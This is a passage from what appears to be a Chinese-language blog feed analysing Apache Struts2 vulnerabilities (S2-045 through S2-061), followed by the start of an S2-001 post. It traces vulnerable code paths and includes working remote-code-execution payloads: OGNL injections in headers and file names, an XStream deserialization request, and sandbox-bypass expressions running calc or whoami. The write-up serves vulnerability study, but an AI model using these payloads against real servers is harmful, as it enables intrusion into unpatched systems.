class="hljs-selector-class">.xwork2</span>.util)<br>buildErrorMessage:<span class="hljs-number">123</span>, JakartaMultiPartRequest (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.multipart)<br>parse:<span class="hljs-number">105</span>, JakartaMultiPartRequest (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.multipart)<br>&lt;init&gt;:<span class="hljs-number">84</span>, MultiPartRequestWrapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.multipart)<br>wrapRequest:<span class="hljs-number">838</span>, Dispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>wrapRequest:<span class="hljs-number">137</span>, PrepareOperations (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.ng)<br>doFilter:<span class="hljs-number">91</span>, StrutsPrepareAndExecuteFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span><span class="hljs-selector-class">.ng</span>.<span class="hljs-attribute">filter</span>)<br></code></pre></td></tr></table></figure><p>报错信息是如何可控的呢？</p><p>在 JakartaMultiPartRequest#processUpload 中 调用 parseRequest</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413171908430.png" alt="image-20250413171908430"></p><p>FileUploadBase#parseRequest 有 %s 接收 e.getMessage())  e </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413172103948.png" alt="image-20250413172103948"></p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">Content-<span class="hljs-built_in">Type</span>: -multipart/form-data-%&#123;#_memberAccess=<span class="hljs-meta">@ognl</span>.OgnlContext<span class="hljs-meta">@DEFAULT</span>_MEMBER_ACCESS,<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime</span>().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413142002636.png" alt="image-20250413142002636"></p><h2 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-046">https://cwiki.apache.org/confluence/display/WW/S2-046</a></p><p>S2-046和前面的S2-045 触发方式是一样的，但是入口不同</p><p>在 JakartaMultiPartRequest#processUpload 同样对文件名做了处理</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413172406781.png" alt="image-20250413172406781"></p><p>会调用  getName() 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413172622525.png" alt="image-20250413172622525"></p><p>跟前调用 Streams#checkFileName 这个方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413184620091.png" alt="image-20250413184620091"></p><p>可以发现满足有 <code>fileName != null &amp;&amp; fileName.indexOf(0) != -1</code> 也就是满足有 <code>\u0000</code></p><p>payload和 S2-045 是一样的，只是换到了 filename 这个变量上</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">\u0000%&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().<span class="hljs-keyword">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h2 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h2><p>影响版本：Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-052">https://cwiki.apache.org/confluence/display/WW/S2-052</a></p><p>REST 插件使用带有 XStream 实例的<code>XStreamHandler</code>进行反序列化，且没有任何类型过滤，在反序列化 XML 有效负载时，这可能会导致远程代码执行。</p><p>我 REST 插件的配置文件中，注册了一个 <code>org.apache.struts2.rest.ContentTypeInterceptor</code> ,用来根据不同的contentType 来获取不同的 <code>ContentTypeHandler</code>  解析请求的处理</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414100846761.png" alt="image-20250414100846761"></p><p>看一下这个getHandlerForRequest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ContentTypeHandler <span class="hljs-title function_">getHandlerForRequest</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-type">ContentTypeHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// 1. 首先尝试通过请求的Content-Type头获取处理器</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> request.getContentType();<br>    <span class="hljs-keyword">if</span> (contentType != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 1.1 直接匹配完整的Content-Type</span><br>        handler = (ContentTypeHandler)<span class="hljs-built_in">this</span>.handlersByContentType.get(contentType);<br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 1.2 如果完整匹配失败，尝试去掉参数部分(如去掉charset=UTF-8等)</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> contentType.indexOf(<span class="hljs-number">59</span>); <span class="hljs-comment">// 59是分号&#x27;;&#x27;的ASCII码</span><br>            <span class="hljs-keyword">if</span> (index != -<span class="hljs-number">1</span>) &#123;<br>                contentType = contentType.substring(<span class="hljs-number">0</span>, index).trim();<br>            &#125;<br>            <span class="hljs-comment">// 1.3 再次尝试匹配简化后的Content-Type</span><br>            handler = (ContentTypeHandler)<span class="hljs-built_in">this</span>.handlersByContentType.get(contentType);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 2. 如果通过Content-Type没有找到处理器，尝试通过扩展名获取</span><br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.findExtension(request.getRequestURI());<br>        handler = (ContentTypeHandler)<span class="hljs-built_in">this</span>.handlersByExtension.get(extension);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> handler;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现会根据 Content-Type 或者 扩展名 来过去 ContentTypeHandler</p><p>发现有 6 个实现</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414100626286.png" alt="image-20250414100626286"></p><p>我们主要来看 XStreamHandler 的处理，在 ContentTypeInterceptor 获取到 XStreamHandler 会去调用它的 toObject方法，对输入流进行处理</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414101018351.png" alt="image-20250414101018351"></p><p>fromXml 对 xml的输入流进行反序列化</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414101204372.png" alt="image-20250414101204372"></p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /struts2_rest_showcase_war_exploded/orders.xhtml HTTP/1.1<br>Host: localhost:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>DNT: 1<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/xml<br>Content-Length: 2359<br><br><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">cipher</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">initialized</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">opmode</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">serviceIterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">redirectErrorStream</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">serviceIterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">lock</span>/&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">cipher</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ibuffer</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">done</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ostart</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ofinish</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">closed</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h2><p>影响版本：Struts 2.0.0 - 2.3.33，Struts 2.5 - Struts 2.5.10.1 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-053">https://cwiki.apache.org/confluence/display/WW/S2-053</a></p><p>服务端将用户可控的参数放到了 Freemarker 的标签属性中,在结果解析时，导致RCE</p><p>在解析FreeMarker标签结果时，会调用 FreemarkerResult#doExecute  方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414105820120.png" alt="image-20250414105820120"></p><p>Template#process 继续调用 freemarker.core.Environment#process </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110037624.png" alt="image-20250414110037624"></p><p>一路调用 Environment#visit &#x3D;&gt; TemplateElement#accept</p><p>accept 有很多不同的实现</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110342149.png" alt="image-20250414110342149"></p><p>漏洞点就在freemarker.core.UnifiedCall#accept 这个方法 ，执行 visitAndTransform</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110610432.png" alt="image-20250414110610432"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110646630.png" alt="image-20250414110646630"></p><p>afterBody() 会去调用 end 方法，这就跟 S2-001 一致了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110918614.png" alt="image-20250414110918614"></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;whoami&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;<br></code></pre></td></tr></table></figure><h2 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h2><p>影响版本：Struts 2.0.0 - Struts 2.5.20 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-059">https://cwiki.apache.org/confluence/display/WW/S2-059</a></p><p>这次漏洞是由于标签属性值进行二次表达式解析产生的，同样是在 doStartTag() 和 doEndTag() 解析时触发</p><p>官方给的例子</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">s:url</span> <span class="hljs-attr">var</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/employee&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;list&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">s:a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;%</span></span></span><span class="hljs-template-variable">&#123;skillName&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;%</span></span></span><span class="hljs-template-variable">&#123;url&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>List available Employees<span class="hljs-tag">&lt;/<span class="hljs-name">s:a</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>如果攻击者能够修改请求中的<code>skillName</code>属性，使得未经进一步验证的原始 OGNL 表达式被传递到<code>skillName</code>属性，那么当请求导致标签被渲染时，<code>skillName</code>属性中包含的 OGNL 表达式将被求值。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414183841950.png" alt="image-20250414183841950"></p><p>确实是执行了</p><p>org.apache.struts2.views.jsp.ComponentTagSupport#doStartTag </p><p>执行 populateParams</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414184327167.png" alt="image-20250414184327167"></p><p>会去调用父类的 populateParams</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414184404074.png" alt="image-20250414184404074"></p><p>一直跟如会来到 OgnlTextParser#evaluate 获取到我们传入的表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414185459815.png" alt="image-20250414185459815"></p><p>第二次循环执行我们传入的ognl表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414185638662.png" alt="image-20250414185638662"></p><h2 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h2><p>影响版本：Struts 2.0.0 - Struts 2.5.25 </p><p>参考链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p><p>是对 S2-59的绕过</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;<br>(#im=#application[<span class="hljs-string">&quot;org.apache.tomcat.InstanceManager&quot;</span>]).<br>(#stack=#attr[<span class="hljs-string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>]).<br>(#bm=#im.newInstance(<span class="hljs-string">&quot;org.apache.commons.collections.BeanMap&quot;</span>)).<br>(#bm.setBean(#stack)).<br>(#context=#bm.get(<span class="hljs-string">&quot;context&quot;</span>)).<br>(#bm.setBean(#context)).<br>(#ma=#bm.get(<span class="hljs-string">&quot;memberAccess&quot;</span>)).<br>(#bm.setBean(#ma)).<br>(#emptyset=#im.newInstance(<span class="hljs-string">&quot;java.util.HashSet&quot;</span>)).<br>(#bm.put(<span class="hljs-string">&quot;excludedClasses&quot;</span>,#emptyset)).<br>(#bm.put(<span class="hljs-string">&quot;excludedPackageNames&quot;</span>,#emptyset)).<br>(#arglist=#im.newInstance(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>)).<br>(#arglist.add(<span class="hljs-string">&quot;open -a Calculator.app&quot;</span>).<br>(#execute=#im.newInstance(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>)).<br>(#execute.exec(#arglist))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.javasec.org/java-vuls/Struts/Struts2-2.html">https://www.javasec.org/java-vuls/Struts/Struts2-2.html</a></p><p><a href="https://blog.topsec.com.cn/struts2-s2-059-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://blog.topsec.com.cn/struts2-s2-059-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a><br><a href="https://www.anquanke.com/post/id/225252">https://www.anquanke.com/post/id/225252</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Struts2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>struts2漏洞1-9</title>
    <link href="/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-9/"/>
    <url>/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-9/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="struts2-漏洞"><a href="#struts2-漏洞" class="headerlink" title="struts2 漏洞"></a>struts2 漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Struts2 是一款 JavaWeb MVC (Model-View-Controller)  框架，同时它具有如下特性：</p><ol><li><strong>POJO (Plain Old Java Object) Action:</strong> 控制器（Action）是简单的 Java 类，不需要实现特定的接口或继承特定的类（尽管可以继承 <code>ActionSupport</code> 来获得便利方法），这使得测试更加容易。</li><li><strong>拦截器 (Interceptors):</strong> Struts 2 的核心。它们提供了一种面向切面编程 (AOP) 的方式来处理横切关注点，如日志记录、验证、文件上传、安全检查、数据绑定等。请求在到达 Action 之前和之后都会经过一系列配置好的拦截器。</li><li><strong>OGNL (Object-Graph Navigation Language):</strong> 强大的表达式语言，用于在视图层（如 JSP）访问和操作 <code>ValueStack</code> 中的数据，以及进行类型转换和数据绑定。<strong>（这也是 Struts 2 历史上许多严重安全漏洞的根源）</strong></li><li><strong>ValueStack:</strong> 每个请求的核心数据存储区域。它是一个栈结构，用于存放 Action 实例、模型对象以及其他上下文数据，使得 OGNL 可以方便地访问这些数据。</li><li><strong>结果类型 (Result Types):</strong> 定义了 Action 执行完毕后如何处理响应。常见的类型包括 <code>dispatcher</code> (转发到 JSP&#x2F;HTML), <code>redirect</code> (重定向到另一个 URL), <code>stream</code> (返回文件流), <code>json</code> (返回 JSON 数据) 等。结果是可配置和可扩展的。</li><li><strong>标签库 (Tag Library):</strong> 提供了一套丰富的 JSP 标签（如 <code>&lt;s:property&gt;</code>, <code>&lt;s:textfield&gt;</code>, <code>&lt;s:iterator&gt;</code>），用于简化视图开发，特别是与 <code>ValueStack</code> 和 OGNL 的集成。</li><li><strong>插件架构 (Plugins):</strong> 允许方便地集成第三方功能，如 Spring 集成、REST 支持、JSON 支持、Convention 插件（约定优于配置）等。</li><li><strong>基于 XML 或注解的配置：</strong> 主要通过 <code>struts.xml</code> 文件来配置 Action 映射、拦截器栈、结果等，但也支持使用注解进行配置（需要 Convention 插件）。</li></ol><p>漏洞项目：<a href="https://github.com/xhycccc/Struts2-Vuln-Demo">https://github.com/xhycccc/Struts2-Vuln-Demo</a></p><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><p>漏洞影响版本：WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8 </p><p>我们直接看入门的代码吧，以 s2-001 漏洞为例，了解一下 strut2 的运行机制和漏洞的产生原因</p><p>在 idea 中创建一个 webapp 的 maven 项目，引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改 web.xml，添加过滤器和映射路径</p><figure class="highlight 